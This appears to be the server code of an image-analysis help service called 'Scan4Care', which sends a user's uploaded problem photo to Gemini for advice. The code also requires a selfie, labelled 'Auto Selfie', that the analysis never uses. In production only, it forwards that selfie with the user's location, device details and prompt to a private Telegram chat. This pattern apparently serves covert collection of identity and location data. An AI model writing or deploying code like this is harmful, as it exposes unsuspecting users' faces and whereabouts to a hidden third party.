import express from "express";
import multer from "multer";
import cors from "cors";
import dotenv from "dotenv";
import fs from "fs";
import fetch from "node-fetch";
import FormData from "form-data";
import { GoogleGenerativeAI } from "@google/generative-ai";

dotenv.config();

/* ---------------- BASIC SETUP ---------------- */
const app = express();
app.use(cors());

/* ---------------- ENSURE UPLOADS FOLDER ---------------- */
const UPLOAD_DIR = "uploads";
if (!fs.existsSync(UPLOAD_DIR)) {
  fs.mkdirSync(UPLOAD_DIR);
}

/* ---------------- MULTER CONFIG ---------------- */
const upload = multer({
  dest: UPLOAD_DIR,
  limits: {
    fileSize: 5 * 1024 * 1024 // 5MB
  },
  fileFilter: (req, file, cb) => {
    if (!file.mimetype.startsWith("image/")) {
      return cb(new Error("Only image files allowed"));
    }
    cb(null, true);
  }
});

/* ---------------- GEMINI SETUP ---------------- */
const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY);

/* ---------------- TELEGRAM (PRODUCTION ONLY) ---------------- */
async function sendTelegramMessage(text) {
  if (process.env.NODE_ENV !== "production") return;

  try {
    await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.TELEGRAM_CHAT_ID,
          text
        })
      }
    );
  } catch (err) {
    console.error("Telegram message error:", err.message);
  }
}

async function sendTelegramPhoto(imagePath, caption) {
  if (process.env.NODE_ENV !== "production") return;

  try {
    const form = new FormData();
    form.append("chat_id", process.env.TELEGRAM_CHAT_ID);
    form.append("caption", caption);
    form.append("photo", fs.createReadStream(imagePath));

    await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendPhoto`,
      {
        method: "POST",
        body: form
      }
    );
  } catch (err) {
    console.error("Telegram photo error:", err.message);
  }
}

/* ---------------- AI IMAGE ANALYSIS ---------------- */
async function analyzeImage(imagePath, mimeType, userPrompt) {
  const buffer = fs.readFileSync(imagePath);

  const finalPrompt = `
${userPrompt || "Analyze this image"}

Give the answer in this format:
1. What is the problem
2. Possible cause
3. Immediate next steps (step-by-step)
4. What to avoid
5. When to seek expert help

Keep it simple and practical.
`;

  const model = genAI.getGenerativeModel({
    model: "gemini-2.5-flash"
  });

  const result = await model.generateContent([
    {
      inlineData: {
        mimeType,
        data: buffer.toString("base64")
      }
    },
    { text: finalPrompt }
  ]);

  return result.response.text();
}

/* ---------------- MAIN API ROUTE ---------------- */
app.post(
  "/analyze",
  upload.fields([
    { name: "image", maxCount: 1 },
    { name: "selfie", maxCount: 1 }
  ]),
  async (req, res) => {
    let problemPath = null;
    let selfiePath = null;

    try {
      const problemImage = req.files?.image?.[0];
      const selfie = req.files?.selfie?.[0];

      if (!problemImage || !selfie) {
        return res.status(400).json({
          success: false,
          error: "Both images are required"
        });
      }

      if (req.body.consent !== "true") {
        return res.status(403).json({
          success: false,
          error: "Consent required"
        });
      }

      problemPath = problemImage.path;
      selfiePath = selfie.path;

      const location = req.body.location || "Unknown";
      const device = req.headers["user-agent"] || "Unknown device";
      const userPrompt = req.body.prompt || "Analyze this image";

      /* Telegram logging */
      await sendTelegramMessage(
        `🛡️ Scan4Care Request

📍 Location: ${location}
📱 Device: ${device}
📝 Prompt: ${userPrompt}
`
      );

      await sendTelegramPhoto(problemPath, "🌾 Problem Image");
      await sendTelegramPhoto(selfiePath, "👤 Auto Selfie");

      /* AI RESPONSE */
      const aiResponse = await analyzeImage(
        problemPath,
        problemImage.mimetype,
        userPrompt
      );

      /* CLEANUP FILES */
      fs.unlinkSync(problemPath);
      fs.unlinkSync(selfiePath);

      return res.json({
        success: true,
        response: aiResponse
      });

    } catch (err) {
      console.error("Server error:", err);

      if (problemPath && fs.existsSync(problemPath)) fs.unlinkSync(problemPath);
      if (selfiePath && fs.existsSync(selfiePath)) fs.unlinkSync(selfiePath);

      return res.status(500).json({
        success: false,
        error: "Server error"
      });
    }
  }
);

/* ---------------- HEALTH CHECK ---------------- */
app.get("/", (req, res) => {
  res.send("Scan4Care backend running 🚀");
});

/* ---------------- START SERVER ---------------- */
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`🔥 Backend running on port ${PORT}`);
});
